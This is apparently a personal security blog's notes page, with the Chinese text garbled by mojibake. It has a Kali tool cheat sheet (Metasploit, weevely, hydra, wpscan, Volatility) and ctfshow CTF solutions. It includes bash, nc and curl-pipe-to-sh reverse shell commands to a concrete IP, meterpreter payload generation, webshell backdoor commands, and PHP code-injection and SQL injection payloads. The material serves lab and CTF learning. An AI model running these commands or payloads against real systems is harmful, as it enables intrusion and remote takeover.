<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">(4æ¡æ¶ˆæ¯) ã€å·¥å…·ä½¿ç”¨ã€‘â€”â€”Metasploit(MSF)ä½¿ç”¨è¯¦è§£(è¶…è¯¦ç»†)_metasploitä½¿ç”¨æ•™ç¨‹_å‰‘å®¢ getshellçš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p><a href="https://blog.csdn.net/weixin_44268918/article/details/129771330">(9æ¡æ¶ˆæ¯) äº‘æœåŠ¡å™¨åœ¨CentOS7ä¸­å®‰è£…msfå·¥å…·_centos7å®‰è£…msf_å‰æ¤’é±¼å¤´æ²¡å‰æ¤’çš„åšå®¢-CSDNåšå®¢</a></p>
<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.158.129 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=101.43.182.125 LPORT=9999 R &gt; test.php</span><br></pre></td></tr></table></figure>

<h3 id="bash-åå¼¹shell"><a href="#bash-åå¼¹shell" class="headerlink" title="bash åå¼¹shell"></a>bash åå¼¹shell</h3><p><strong>æŸ¥è¯¢å½“å‰shellå‘½ä»¤</strong>  <strong>ls -l &#x2F;bin&#x2F;sh</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/101.43.182.125/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>ç”±äºæœ‰çš„dockerå¹¶æ²¡æœ‰bashå‘½ä»¤ï¼Œå¯ä»¥é…åˆä½¿ç”¨curlæŒ‡ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. On your machine:</span><br><span class="line">#      nc -l 1337</span><br><span class="line">#</span><br><span class="line"># 2. On the target machine:</span><br><span class="line">curl https://your-shell.com/yourip:1337 | sh</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://your-shell.com/101.43.182.125:5000 | sh</span><br></pre></td></tr></table></figure>

<p>ç”±äºæˆ‘çš„äº‘æœåŠ¡å™¨å·²ç»å¼€èµ·äº†httpæœåŠ¡ï¼Œä½†æ˜¯æˆ‘å¹¶ä¸æƒ³åœ¨æˆ‘çš„ç½‘ç«™ä¸‹æ”¾å†…å®¹æ‰€ä»¥</p>
<p>å¯ä»¥ä½¿ç”¨python3 å¿«é€Ÿåˆ›å»ºä¸€ä¸ªhttp æœåŠ¡åœ¨æŸä¸ªç«¯å£</p>
<p>cdï¼Œåˆ°ä½ æƒ³è¦çš„æŸä¸ªæ–‡ä»¶å¤¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server ç«¯å£</span><br></pre></td></tr></table></figure>

<p>åœ¨è¯¥ç«¯å£ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</p>
<h3 id="ncåå¼¹shell"><a href="#ncåå¼¹shell" class="headerlink" title="ncåå¼¹shell"></a>ncåå¼¹shell</h3><p>åå‘è¿æ¥</p>
<p>æ”»å‡»æœºæ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<p>é¶æœºæ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 101.43.182.125 5000 -e /bin/sh</span><br></pre></td></tr></table></figure>

<h2 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h2><p>linuxä¸­çš„èœåˆ€</p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/106587791">(10æ¡æ¶ˆæ¯) Weevely(Linuxä¸­çš„èœåˆ€)_zhangä¸‰çš„åšå®¢-CSDNåšå®¢</a></p>
<p>weevely:ç”Ÿæˆä»¥åŠè¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate &lt;è¿æ¥å¯†ç &gt; &lt;path&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely &lt;url&gt; &lt;è¿æ¥å¯†ç &gt;</span><br></pre></td></tr></table></figure>

<p>å±•ç¤ºçœŸå®ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:audit_etcpasswd -real</span><br></pre></td></tr></table></figure>

<p> åå¼¹shell </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backdoor_reversetcp 192.168.1.9 3366</span><br></pre></td></tr></table></figure>

<h2 id="tplmap-ä¸‹è½½å®‰è£…"><a href="#tplmap-ä¸‹è½½å®‰è£…" class="headerlink" title="tplmap ä¸‹è½½å®‰è£…"></a>tplmap ä¸‹è½½å®‰è£…</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå®‰è£…æˆåŠŸå³å¯ä½¿ç”¨</p>
<p>è‹¥å‡º<strong>error: subprocess-exited-with-error</strong>ï¼Œè¿™é‡Œæˆ‘å¿˜è®°æˆªå±äº†åˆ™å‚è€ƒè¿™ä¸ª</p>
<p><a href="https://www.cnblogs.com/ktsm/p/15691652.html">kali ä¸‹å®‰è£…tplmap - KittySmith - åšå®¢å›­ (cnblogs.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># è¿›å…¥å®¶ç›®å½•</span><br><span class="line">cd </span><br><span class="line"></span><br><span class="line">#å»ºç«‹ç›®å½•ins-pip2</span><br><span class="line">mkdir ins-pip2</span><br><span class="line"></span><br><span class="line">#ä¸‹è½½pip2å®‰è£…è„šæœ¬</span><br><span class="line">wget  https://bootstrap.pypa.io/pip/2.6/get-pip.py</span><br><span class="line"></span><br><span class="line">#python2æ‰§è¡Œ éœ€è¦sudoæƒé™</span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">#å‡çº§pip2</span><br><span class="line">sudo pip2 install --upgrade pip </span><br><span class="line"></span><br><span class="line">#å®‰è£…pip2æ‰©å±•å·¥å…·ï¼Œä¸ç„¶åé¢å®‰è£…è¿˜æ˜¯æŠ¥é”™</span><br><span class="line">sudo pip2 install --upgrade setuptools </span><br></pre></td></tr></table></figure>

<h2 id="cewlä½¿ç”¨"><a href="#cewlä½¿ç”¨" class="headerlink" title="cewlä½¿ç”¨"></a>cewlä½¿ç”¨</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€‰é¡¹:</span><br><span class="line">    -h, --help: æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯.</span><br><span class="line">    -k, --keep: ä¿å­˜ä¸‹è½½çš„æ–‡ä»¶.</span><br><span class="line">    -d &lt;x&gt;,--depth &lt;x&gt;: çˆ¬è¡Œåˆ°çš„æ·±åº¦ï¼Œé»˜è®¤ä¸º2ã€‚</span><br><span class="line">    -m, --min_word_length: æœ€å°å­—é•¿ï¼Œé»˜è®¤ä¸º3ã€‚</span><br><span class="line">    -o, --offsite: è®©èœ˜è››è®¿é—®å…¶ä»–ç½‘ç«™.</span><br><span class="line">    --exclude: åŒ…å«è¦æ’é™¤çš„è·¯å¾„åˆ—è¡¨çš„æ–‡ä»¶</span><br><span class="line">    --allowed: è·¯å¾„å¿…é¡»åŒ¹é…æ‰èƒ½éµå¾ªçš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼</span><br><span class="line">    -w, --write: å°†è¾“å‡ºå†™å…¥æ–‡ä»¶ã€‚</span><br><span class="line">    -u, --ua &lt;agent&gt;: è¦è®¾ç½®çš„ç”¨æˆ·ä»£ç†.</span><br><span class="line">    -n, --no-words: ä¸è¦è¾“å‡ºå•è¯åˆ—è¡¨ã€‚</span><br><span class="line">    -g &lt;x&gt;, --groups &lt;x&gt;: ä¹Ÿè¿”å›å•è¯ç»„</span><br><span class="line">    --lowercase: æ‰€æœ‰è§£æçš„å•è¯å°å†™</span><br><span class="line">    --with-numbers: æ¥å—åŒ…å«æ•°å­—å’Œå­—æ¯çš„å•è¯</span><br><span class="line">    --convert-umlauts: è½¬æ¢é€šç”¨ISO-8859-1 (Latin-1)çš„å˜ä½“(Ã¤-aeï¼Œ Ã¶-oeï¼Œ Ã¼-ueï¼Œ ÃŸ-ss)</span><br><span class="line">    -a, --meta: åŒ…æ‹¬å…ƒæ•°æ®ã€‚</span><br><span class="line">    --meta_file file: å…ƒæ•°æ®çš„è¾“å‡ºæ–‡ä»¶ã€‚</span><br><span class="line">    -e, --email: åŒ…æ‹¬ç”µå­é‚®ä»¶åœ°å€ã€‚</span><br><span class="line">    --email_file &lt;file&gt;: è¾“å‡ºæ–‡ä»¶çš„ç”µå­é‚®ä»¶åœ°å€ã€‚</span><br><span class="line">    --meta-temp-dir &lt;dir&gt;: exiftoolåœ¨è§£ææ–‡ä»¶æ—¶ä½¿ç”¨çš„ä¸´æ—¶ç›®å½•ï¼Œé»˜è®¤ä¸º/tmpã€‚</span><br><span class="line">    -c, --count: ä¸ºæ¯ä¸ªå•è¯å‘ç°æ˜¾ç¤ºè®¡æ•°ã€‚</span><br><span class="line">    -v, --verbose: è¯¦ç»†è¾“å‡º.</span><br><span class="line">    --debug: é¢å¤–çš„è°ƒè¯•ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">    èº«ä»½éªŒè¯</span><br><span class="line">    --auth_type: Digest æˆ– basic.</span><br><span class="line">    --auth_user: ç”¨æˆ·åã€‚</span><br><span class="line">    --auth_pass: å¯†ç èº«ä»½éªŒè¯.</span><br><span class="line"></span><br><span class="line">    ä»£ç†æ”¯æŒ</span><br><span class="line">    --proxy_host: ä»£ç†ä¸»æœº.</span><br><span class="line">    --proxy_port: ä»£ç†ç«¯å£,é»˜è®¤8080.</span><br><span class="line">    --proxy_username: å¦‚æœéœ€è¦ï¼Œä»£ç†ç”¨æˆ·å.</span><br><span class="line">    --proxy_password: å¦‚æœéœ€è¦ï¼Œä»£ç†å¯†ç .</span><br><span class="line">    </span><br><span class="line">    Headers</span><br><span class="line">    --header, -H: æ ¼å¼ä¸ºname:value -å¯ä»¥ä¼ é€’å¤šä¸ª</span><br></pre></td></tr></table></figure>

<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan -update  #å‡çº§æ¼æ´åº“</span><br><span class="line">wpscan -u http://192.168.10.44   #æ‰«æWordPressç«™ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨ -u æˆ–è€… --url å‚æ•°éƒ½å¯</span><br><span class="line">wpscan -u http://192.168.10.44 --enumerate t  #ä¸»é¢˜æ‰«æ</span><br><span class="line">wpscan -u http://192.168.10.44 --enumerate vt  #ä¸»é¢˜æ‰«æ</span><br><span class="line">wpscan -u http://192.168.10.44 --enumerate p  #æ’ä»¶æ‰«æ</span><br><span class="line">wpscan -u http://192.168.10.44 --enumerate u  #æšä¸¾ç”¨æˆ·</span><br></pre></td></tr></table></figure>

<h2 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h2><p>2å¥½åƒè·‘ä¸å‡ºæ¥ï¼Œäºæ˜¯ç”¨äº†3ï¼Œå¥½ç´¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/volatilityfoundation/volatility3.git</span><br></pre></td></tr></table></figure>

<p>cdåˆ°æ–‡ä»¶å¤¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements-minimal.txt</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 setup.py build</span><br><span class="line">python3 setup.py install</span><br><span class="line">sudo apt install libsnappy-dev</span><br><span class="line">pip3 install distorm3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">å¸¸ç”¨æ’ä»¶ï¼š</span><br><span class="line">layerwriterï¼šåˆ—å‡ºå†…å­˜é•œåƒplatformä¿¡æ¯</span><br><span class="line">linux.bashï¼šä»å†…å­˜ä¸­æ¢å¤bashå‘½ä»¤å†å²è®°å½•</span><br><span class="line">linux.check_afinfoï¼šéªŒè¯ç½‘ç»œåè®®çš„æ“ä½œåŠŸèƒ½æŒ‡é’ˆ</span><br><span class="line">linux.check_syscallï¼šæ£€æŸ¥ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­çš„æŒ‚é’©</span><br><span class="line">linux.elfsï¼šåˆ—å‡ºæ‰€æœ‰è¿›ç¨‹çš„æ‰€æœ‰å†…å­˜æ˜ å°„ELFæ–‡ä»¶</span><br><span class="line">linux.lsmodï¼šåˆ—å‡ºåŠ è½½çš„å†…æ ¸æ¨¡å—</span><br><span class="line">linux.lsofï¼šåˆ—å‡ºæ‰€æœ‰è¿›ç¨‹çš„æ‰€æœ‰å†…å­˜æ˜ å°„</span><br><span class="line">linux.malfindï¼šåˆ—å‡ºå¯èƒ½åŒ…å«æ³¨å…¥ä»£ç çš„è¿›ç¨‹å†…å­˜èŒƒå›´</span><br><span class="line">linux.procï¼šåˆ—å‡ºæ‰€æœ‰è¿›ç¨‹çš„æ‰€æœ‰å†…å­˜æ˜ å°„</span><br><span class="line">linux.pslistï¼šåˆ—å‡ºlinuxå†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„è¿›ç¨‹</span><br><span class="line">linux.pstreeï¼šåˆ—å‡ºè¿›ç¨‹æ ‘</span><br><span class="line">mac.bashï¼šä»å†…å­˜ä¸­æ¢å¤bashå‘½ä»¤å†å²è®°å½•</span><br><span class="line">mac.check_syscallï¼šæ£€æŸ¥ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­çš„æŒ‚é’©</span><br><span class="line">mac.check_sysctlï¼šæ£€æŸ¥sysctlå¤„ç†ç¨‹åºçš„æŒ‚é’©</span><br><span class="line">mac.check_trap_tableï¼šæ£€æŸ¥trapè¡¨ä¸­çš„æŒ‚é’©</span><br><span class="line">mac.ifconfigï¼šåˆ—å‡ºç½‘å¡ä¿¡æ¯</span><br><span class="line">mac.lsmodï¼šåˆ—å‡ºåŠ è½½çš„å†…æ ¸æ¨¡å—</span><br><span class="line">mac.lsofï¼šåˆ—å‡ºæ‰€æœ‰è¿›ç¨‹çš„æ‰€æœ‰å†…å­˜æ˜ å°„</span><br><span class="line">mac.malfindï¼šåˆ—å‡ºå¯èƒ½åŒ…å«æ³¨å…¥ä»£ç çš„è¿›ç¨‹å†…å­˜èŒƒå›´</span><br><span class="line">mac.netstatï¼šåˆ—å‡ºæ‰€æœ‰è¿›ç¨‹çš„æ‰€æœ‰ç½‘ç»œè¿æ¥</span><br><span class="line">mac.psauxï¼šæ¢å¤ç¨‹åºå‘½ä»¤è¡Œå‚æ•°</span><br><span class="line">mac.pslistï¼šåˆ—å‡ºlinuxå†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„è¿›ç¨‹</span><br><span class="line">mac.pstreeï¼šåˆ—å‡ºè¿›ç¨‹æ ‘</span><br><span class="line">mac.tasksï¼šåˆ—å‡ºMacå†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„è¿›ç¨‹</span><br><span class="line">windows.infoï¼šæ˜¾ç¤ºæ­£åœ¨åˆ†æçš„å†…å­˜æ ·æœ¬çš„OSå’Œå†…æ ¸è¯¦ç»†ä¿¡æ¯</span><br><span class="line">windows.callbacksï¼šåˆ—å‡ºå†…æ ¸å›è°ƒå’Œé€šçŸ¥ä¾‹ç¨‹</span><br><span class="line">windows.cmdlineï¼šåˆ—å‡ºè¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°</span><br><span class="line">windows.dlldumpï¼šå°†è¿›ç¨‹å†…å­˜èŒƒå›´DLLè½¬å‚¨</span><br><span class="line">windows.dlllistï¼šåˆ—å‡ºWindowså†…å­˜æ˜ åƒä¸­å·²åŠ è½½çš„dllæ¨¡å—</span><br><span class="line">windows.driverirpï¼šåœ¨Windowså†…å­˜æ˜ åƒä¸­åˆ—å‡ºé©±åŠ¨ç¨‹åºçš„IRP</span><br><span class="line">windows.driverscanï¼šæ‰«æWindowså†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„é©±åŠ¨ç¨‹åº</span><br><span class="line">windows.filescanï¼šæ‰«æWindowså†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„æ–‡ä»¶å¯¹è±¡</span><br><span class="line">windows.handlesï¼šåˆ—å‡ºè¿›ç¨‹æ‰“å¼€çš„å¥æŸ„</span><br><span class="line">windows.malfindï¼šåˆ—å‡ºå¯èƒ½åŒ…å«æ³¨å…¥ä»£ç çš„è¿›ç¨‹å†…å­˜èŒƒå›´</span><br><span class="line">windows.moddumpï¼šè½¬å‚¨å†…æ ¸æ¨¡å—</span><br><span class="line">windows.modscanï¼šæ‰«æWindowså†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„æ¨¡å—</span><br><span class="line">windows.mutantscanï¼šæ‰«æWindowså†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„äº’æ–¥é”</span><br><span class="line">windows.pslistï¼šåˆ—å‡ºWindowså†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„è¿›ç¨‹</span><br><span class="line">windows.psscanï¼šæ‰«æWindowså†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„è¿›ç¨‹</span><br><span class="line">windows.pstreeï¼šåˆ—å‡ºè¿›ç¨‹æ ‘</span><br><span class="line">windows.procdumpï¼šè½¬å‚¨å¤„ç†å¯æ‰§è¡Œæ˜ åƒ</span><br><span class="line">windows.registry.certificatesï¼šåˆ—å‡ºæ³¨å†Œè¡¨ä¸­å­˜å‚¨çš„è¯ä¹¦</span><br><span class="line">windows.registry.hivelistï¼šåˆ—å‡ºå†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„æ³¨å†Œè¡¨é…ç½®å•å…ƒ</span><br><span class="line">windows.registry.hivescanï¼šæ‰«æWindowså†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„æ³¨å†Œè¡¨é…ç½®å•å…ƒ</span><br><span class="line">windows.registry.printkeyï¼šåœ¨é…ç½®å•å…ƒæˆ–ç‰¹å®šé”®å€¼ä¸‹åˆ—å‡ºæ³¨å†Œè¡¨é¡¹</span><br><span class="line">windows.registry.userassistï¼šæ‰“å°ç”¨æˆ·åŠ©æ‰‹æ³¨å†Œè¡¨é¡¹å’Œä¿¡æ¯</span><br><span class="line">windows.ssdtï¼šåˆ—å‡ºç³»ç»Ÿè°ƒç”¨è¡¨</span><br><span class="line">windows.stringsï¼šè¯»å–å­—ç¬¦ä¸²å‘½ä»¤çš„è¾“å‡ºï¼Œå¹¶æŒ‡ç¤ºæ¯ä¸ªå­—ç¬¦ä¸²å±äºå“ªä¸ªè¿›ç¨‹</span><br><span class="line">windows.svcscanï¼šæ‰«æWindowsæœåŠ¡</span><br><span class="line">windows.symlinkscanï¼šæ‰«æWindowså†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„é“¾æ¥</span><br></pre></td></tr></table></figure>



<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>md5 ç ´è§£å·¥å…·</p>
<p>ä½¿ç”¨æ–¹å¼ï¼Œå°†æ–‡ä»¶ä¿å­˜åœ¨ 1.txt</p>
<p>å‘½ä»¤æ‰§è¡Œ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>

<h2 id="hydra-ä½¿ç”¨"><a href="#hydra-ä½¿ç”¨" class="headerlink" title="hydra ä½¿ç”¨"></a>hydra ä½¿ç”¨</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l login å°å†™ï¼ŒæŒ‡å®šç”¨æˆ·åè¿›è¡Œç ´è§£</span><br><span class="line">-L file å¤§å†™ï¼ŒæŒ‡å®šç”¨æˆ·çš„ç”¨æˆ·åå­—å…¸</span><br><span class="line">-p pass å°å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç ç ´è§£ï¼Œå¾ˆå°‘ä½¿ç”¨ï¼Œä¸€èˆ¬é‡‡ç”¨å¯†ç å­—å…¸ã€‚</span><br><span class="line">-P file å¤§å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç å­—å…¸ã€‚</span><br><span class="line">-e ns é¢å¤–çš„é€‰é¡¹ï¼Œnï¼šç©ºå¯†ç è¯•æ¢ï¼Œsï¼šä½¿ç”¨æŒ‡å®šè´¦æˆ·å’Œå¯†ç è¯•æ¢</span><br><span class="line">-M file æŒ‡å®šç›®æ ‡ipåˆ—è¡¨æ–‡ä»¶ï¼Œæ‰¹é‡ç ´è§£ã€‚</span><br><span class="line">-o file æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶</span><br><span class="line">-f æ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£ã€‚</span><br><span class="line">-t tasks åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯16</span><br><span class="line">-w time è®¾ç½®æœ€å¤§è¶…æ—¶æ—¶é—´ï¼Œå•ä½</span><br><span class="line">-v / -V æ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹</span><br><span class="line">-R æ¢å¤çˆ†ç ´ï¼ˆå¦‚æœç ´è§£ä¸­æ–­äº†ï¼Œä¸‹æ¬¡æ‰§è¡Œ hydra -R /path/to/hydra.restore å°±å¯ä»¥ç»§ç»­ä»»åŠ¡ã€‚ï¼‰</span><br><span class="line">-x è‡ªå®šä¹‰å¯†ç ã€‚</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowå¤§èµ›åŸé¢˜</title>
    <url>/2023/07/13/ctfshow%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/</url>
    <content><![CDATA[ <span id="more"></span>

<h2 id="680"><a href="#680" class="headerlink" title="680"></a>680</h2><p>disable_functionç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=var_dump(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®<strong>secret_you_never_know</strong>ï¼Œç„¶åä¸‹è½½ä¾¿æ˜¯flag</p>
<h2 id="681"><a href="#681" class="headerlink" title="681"></a>681</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://79b263f7-6ba8-4456-9907-38d11f112131.challenge.ctf.show/check.php</span><br></pre></td></tr></table></figure>

<p>name&#x3D;||1#\</p>
<h2 id="683"><a href="#683" class="headerlink" title="683"></a>683</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">if(isset($_GET[&#x27;ç§€&#x27;]))&#123;</span><br><span class="line">    if(!is_numeric($_GET[&#x27;ç§€&#x27;]))&#123;</span><br><span class="line">       die(&#x27;å¿…é¡»æ˜¯æ•°å­—&#x27;);</span><br><span class="line">    &#125;else if($_GET[&#x27;ç§€&#x27;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</span><br><span class="line">       die(&#x27;ä½ å¤ªçŸ­äº†&#x27;);</span><br><span class="line">    &#125;else if($_GET[&#x27;ç§€&#x27;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">        die(&#x27;ä½ å¤ªé•¿äº†&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        sleep((int)$_GET[&#x27;ç§€&#x27;]);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep((int)$_GET[&#x27;ç§€&#x27;]);</span><br><span class="line">å¯ä»¥ç”¨16è¿›åˆ¶ç»•ï¼Œä¼šè¢«å¼ºè½¬æˆ 0</span><br><span class="line">0x755000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ç§€=0x76a699</span><br></pre></td></tr></table></figure>

<h2 id="684"><a href="#684" class="headerlink" title="684"></a>684</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&#x27;action&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">$arg = $_GET[&#x27;arg&#x27;] ?? &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&#x27;&#x27;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¦–å…ˆè¿‡æ»¤ctfshow ä¸èƒ½æ˜¯å­—æ¯æ•°å­—ä¸‹åˆ’çº¿</span><br><span class="line"></span><br><span class="line">åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º\ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨\è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œ</span><br><span class="line">è°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚</span><br><span class="line">å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</span><br><span class="line"></span><br><span class="line">create_function(&#x27;$a&#x27;,&#x27;return 111&#x27;)</span><br><span class="line">ç­‰ä»·äº</span><br><span class="line">function a($a)&#123;</span><br><span class="line">    return 111;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">create_function(&#x27;$a&#x27;,&#x27;return 111;&#125;phpinfo();//&#x27;ï¼‰</span><br><span class="line">ç­‰ä»·äº</span><br><span class="line">function a($a)&#123;</span><br><span class="line">    return 111;&#125;phpinfo();//</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">æ€»ç»“payloadï¼Œ%5c æ˜¯\ </span><br><span class="line">?action=%5ccreate_function&amp;arg=&#125;system(&quot;cat /secret_you_never_know&quot;);//</span><br></pre></td></tr></table></figure>

<h2 id="685"><a href="#685" class="headerlink" title="685"></a>685</h2><h2 id="686"><a href="#686" class="headerlink" title="686"></a>686</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•ä¸€</p>
<p>getallheaders()</p>
<p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯è¿”å›æ‰€æœ‰çš„HTTPå¤´ä¿¡æ¯ï¼Œä½†æ˜¯è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯è¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè€Œeval()è¦æ±‚çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨ï¼Œè¿™æ—¶æˆ‘ä»¬å°±è¦æƒ³åŠæ³•å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p>
